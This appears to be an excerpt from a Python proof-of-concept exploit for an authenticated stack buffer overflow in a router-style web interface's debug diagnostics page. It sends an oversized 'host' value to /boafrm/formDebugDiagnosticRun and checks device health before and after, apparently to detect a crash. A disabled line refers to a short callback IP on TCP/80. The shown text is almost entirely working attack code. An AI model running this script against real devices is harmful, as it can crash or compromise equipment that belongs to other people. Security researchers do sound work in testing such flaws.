...
def main():
    parser = argparse.ArgumentParser(description='Authenticated stack buffer overflow in debug diagnostics')
    ...
    try:
        opener.open(base + '/debug.htm', timeout=8).read(4096)
    except Exception:
        pass
    payload = 'X' * args.length
    if False and len(payload) >= 33:
        raise SystemExit('V011 payload must remain under 33 bytes; use a short callback IP on TCP/80')
    data = {}
    data['host'] = payload
    data.setdefault('submit-url', '/debug.htm')
    before = health(base)
    started = time.monotonic()
    try:
        status, body = post(opener, base + '/boafrm/formDebugDiagnosticRun', data, base + '/debug.htm')
        error = ''
    except Exception as exc:
